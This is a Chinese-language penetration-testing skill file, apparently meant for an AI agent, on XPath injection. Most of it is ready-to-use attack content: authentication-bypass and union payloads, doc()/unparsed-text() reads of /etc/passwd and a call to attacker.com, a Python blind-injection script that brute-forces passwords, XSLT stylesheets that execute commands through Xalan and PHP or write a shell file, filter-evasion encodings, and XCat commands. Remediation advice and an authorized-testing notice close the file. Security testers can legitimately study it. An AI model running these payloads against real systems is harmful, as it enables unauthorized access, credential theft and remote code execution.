---
name: xpath-injection-testing
description: XPath注入深度测试技能：认证绕过、盲注数据提取、XPath 1.0/2.0差异、XSLT RCE、编码绕过、XML数据库攻击
version: 2.0.0
---

# XPath注入深度测试技能

## 概述

XPath注入类似于SQL注入，攻击者通过注入XPath查询表达式修改逻辑，导致认证绕过、数据泄露。XPath 2.0/XQuery支持更强的数据访问能力，结合XSLT可实现RCE。本技能覆盖XPath 1.0/2.0注入、布尔/时间盲注、全文档数据提取、XSLT服务器端包含RCE、编码绕过。

## 一、XPath注入攻击面

### 1.1 注入点
| 场景 | 示例查询 |
|------|---------|
| 用户登录 | `//user[username/text()='INPUT' and password/text()='INPUT']` |
| 用户搜索 | `//user[contains(name,'INPUT')]` |
| 数据查询 | `/products/category[@name='INPUT']/item` |
| 权限检查 | `//user[@id='INPUT']/isAdmin/text()` |
| XML配置解析 | 动态XPath读取配置值 |
| SOAP/XML服务 | Web Service中XPath查询 |
| SAML断言解析 | XPath处理SAML属性 |
| XSLT转换 | 用户输入嵌入XSLT（可能RCE） |
| XML数据库（eXist/Basex）| XQuery/XPath查询 |
| 文档管理系统 | XPath检索XML文档 |

### 1.2 XPath特殊字符
```
字符   含义
'      字符串定界
"      字符串定界
/      路径分隔
//     任意深度后代
*      通配符（任意节点）
@      属性前缀
[]     谓词（条件）
|      多路径
()     分组
.      当前节点
..     父节点
and/or 逻辑运算
= !=   比较
< > <= >= 比较
+ - * mod 算术
:      命名空间
comment() 注释
text() 文本节点
node() 任意节点
```

## 二、XPath基础语法

### 2.1 常用轴
```
/              根节点
//             任意深度
.              当前节点
..             父节点
@attr          属性
node()         任意节点
text()         文本节点
*              任意元素节点
@*             任意属性
ancestor::     祖先
parent::       父节点
child::        子节点
following-sibling:: 后面的兄弟
preceding-sibling:: 前面的兄弟
```

### 2.2 运算符和函数
```
and or not()   逻辑
= != < > <= >= 比较
+ - * div mod  算术
contains(), starts-with(), ends-with(), matches() (XPath 2.0)
substring(), string-length(), concat(), normalize-space()
count(), sum(), position(), last()
name(), local-name(), namespace-uri()
doc(), doc-available() (XPath 2.0文件读取)
unparsed-text() (XPath 2.0/XQuery读取外部文件)
collection()   (XPath 2.0集合访问)
true() false() 布尔
```

## 三、认证绕过

### 3.1 经典认证绕过
原始查询：`//user[username/text()='INPUT_USER' and password/text()='INPUT_PASS']`

```
用户: ' or '1'='1
密码: ' or '1'='1
→ //user[username/text()='' or '1'='1' and password/text()='' or '1'='1']
→ 永真，返回第一个用户

用户: ' or 1=1 or '
密码: 任意
→ 同上

用户: ']|//*|xxx['
→ 闭合谓词并联合所有节点

用户: ' or count(//user)>0 or '
→ 探测用户数量

用户: admin' or 'a'='b
密码: ' or '1'='2
→ 联合控制逻辑顺序

用户: ' or string-length(password)>0 or '
→ 查询密码非空的用户
```

### 3.2 双引号场景
```
# 查询使用双引号: //user[username="INPUT" and password="INPUT"]
用户: " or "1"="1
密码: " or "1"="1
```

## 四、数据提取

### 4.1 Union风格（XPath无UNION，但可用|）
```
# 组合多个路径返回
']|/ |//*|foo['
# 返回根节点所有数据

']|/*|foo['
# 返回根下所有子节点

']|//user|//password|foo['
# 返回所有用户和密码
```

### 4.2 XPath 2.0/doc()读取文件
```
# doc()加载外部XML文件（若启用）
doc('file:///etc/passwd')
doc('http://attacker.com/data.xml')

# unparsed-text()读取文本文件
unparsed-text('file:///etc/passwd')

# 使用：
user=xxx'] | doc('file:///etc/passwd') | //*[foo='bar
```

## 五、盲注数据提取

### 5.1 布尔盲注
```
# 判断条件成立（通过页面差异）
1. 判断根节点名称
' or name(/*)='users
' or starts-with(name(/*),'u')

2. 逐字符提取数据
' or substring(//user[1]/username,1,1)='a
' or substring(//user[1]/password,1,1)='a
二分法爆破每个字符
```

### 5.2 XPath 2.0 for循环（批量提取）
```
' or string-join(//user/concat(username,':',password),'|')='
# 若输出回显，直接拼接返回
```

### 5.3 时间盲注（XPath 2.0 / XSLT）
XPath本身无延迟函数，但通过XSLT扩展或XQuery可实现：
```
# 若后端使用XSLT，可通过doc()对不可达端口产生延迟
' or doc-available(concat('http://127.0.0.1:',//user/id)) or '
```

### 5.4 自动提取脚本思路
```python
import requests, string

charset = string.printable
data = ""
for pos in range(1, 1000):
    for c in charset:
        if c in "'\"\\":
            continue
        # 使用布尔盲注
        payload = f"x' or substring(//user[1]/password,{pos},1)='{c}' or '"
        r = requests.post(target, data={"user": payload, "pass": "x"})
        if "Login success" in r.text:
            data += c
            print(data)
            break
    else:
        break
```

## 六、XSLT服务器端RCE

### 6.1 XSLT注入风险
如果用户输入能控制XSLT样式表，可通过扩展函数RCE：
```xml
<!-- Java XSLT (Xalan) Runtime.exec -->
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"
xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object">
<xsl:template match="/">
  <xsl:variable name="rtObj" select="rt:getRuntime()"/>
  <xsl:variable name="exec" select="rt:exec($rtObj,'id')"/>
  Command executed!
</xsl:template>
</xsl:stylesheet>

<!-- PHP XSLT -->
<xsl:value-of select="php:function('system','id')"/>

<!-- Saxon/Java 文件写入 -->
<xsl:variable name="f" select="new java.io.FileWriter('/tmp/shell.php')"/>
```

## 七、绕过技术

### 7.1 编码绕过
```
# XML实体绕过WAF
' or &#97;='a  （HTML/XML实体编码）
' or &#x61;='a （十六进制）
&apos;         （XML实体'）
&quot;         （XML实体"）

# 变量/等价表达式
' or starts-with(//user/username,'adm') or '
' or contains(//user/username,'adm') or '
' or not(not(//user[username='admin'])) or '  # 双重否定

# 通配符绕过节点名
/*[starts-with(name(),'u')]  → user节点
//*[contains(text(),'admin')]  → 任意文本包含admin
```

### 7.2 空格/注释绕过
```
# XML注释插入
' or/**/1=1/**/or/**/'
' or/**/substring(//user/password,1,1)='a

# 等价表达式变形
' or 1 eq 1 or '       （XPath 2.0 eq）
' or true() or '
' or //user or '
```

### 7.3 命名空间绕过
```
# 如果有命名空间前缀
/*[local-name()='users']/*[local-name()='user']
# 使用local-name忽略命名空间
```

### 7.4 绕过字符串过滤
```
# 字符串拼接（XPath 2.0）
' or //user[username=concat('ad','min')] or '
' or //user[username=string-join(('a','d','m','i','n'),'')] or '

# 使用codepoints-to-string/string-to-codepoints
' or //user[username=codepoints-to-string(97,100,109,105,110)] or '
```

## 八、工具链

| 工具 | 用途 |
|------|------|
| Burp Suite (Active Scan) | 自动检测XPath注入 |
| XCat | XPath盲注数据提取 |
| xxetri | XPath注入工具 |
| xpath-blind-explorer | 盲注数据提取 |
| XSLT Fuzzer | XSLT转换测试 |
| xmlstarlet | 命令行XPath查询 |
| Oxygen XML | GUI XPath/XSLT测试 |

### XCat使用
```bash
# 自动提取数据
xcat -m POST -t "<user><user>u</user><pass>p</pass></user>" http://target.com/login user=u pass=p -c "//user"
```

## 九、XPath测试清单

- [ ] 所有XPath查询参数（登录/搜索/查询）
- [ ] 单引号/双引号闭合测试
- [ ] 认证绕过（永真条件）
- [ ] 节点枚举（*/node()/text()/comment()）
- [ ] 布尔盲注数据提取
- [ ] | 运算符联合多路径
- [ ] 通配符*绕过节点名匹配
- [ ] XPath 2.0函数（doc()/unparsed-text()/collection()）
- [ ] XSLT扩展函数RCE
- [ ] XML实体编码绕过WAF
- [ ] 字符串拼接/concat绕过字符串过滤
- [ ] 命名空间local-name()绕过
- [ ] XML注释/空白符绕过
- [ ] SOAP/XML接口XPath注入
- [ ] SAML断言XPath处理
- [ ] 错误信息泄露
- [ ] 时间盲注（XSLT场景）
- [ ] 外部实体/文件读取

## 十、修复建议

- **使用参数化XPath**：使用XPath变量/XQuery外部参数，不要字符串拼接
- **XPath 2.0参数绑定**：使用declare variable传入用户输入
- **输入验证**：严格白名单（用户名/ID格式）
- **禁用外部实体**：XPath/XSLT处理器禁用doc()/document()/unparsed-text()
- **禁用XSLT扩展**：禁用Java/.NET扩展函数调用
- **最小权限**：运行XSLT的账户低权限
- **错误处理**：不返回XPath错误详情
- **使用安全XPath构建器**：使用参数化API构造查询
- **Sandbox XSLT**：使用安全模式运行XSLT转换

## 注意事项

- **仅限授权测试**：XPath注入可能读取XML中的敏感配置/用户数据
- **XPath版本差异**：1.0和2.0功能差异大，2.0风险更高
- **XSLT RCE风险**：如果用户能控制XSLT样式表，直接RCE
- **XML数据库影响**：eXist/Basex等原生XML数据库风险更高
- **合规要求**：遵守《网络安全法》，仅在授权范围内测试
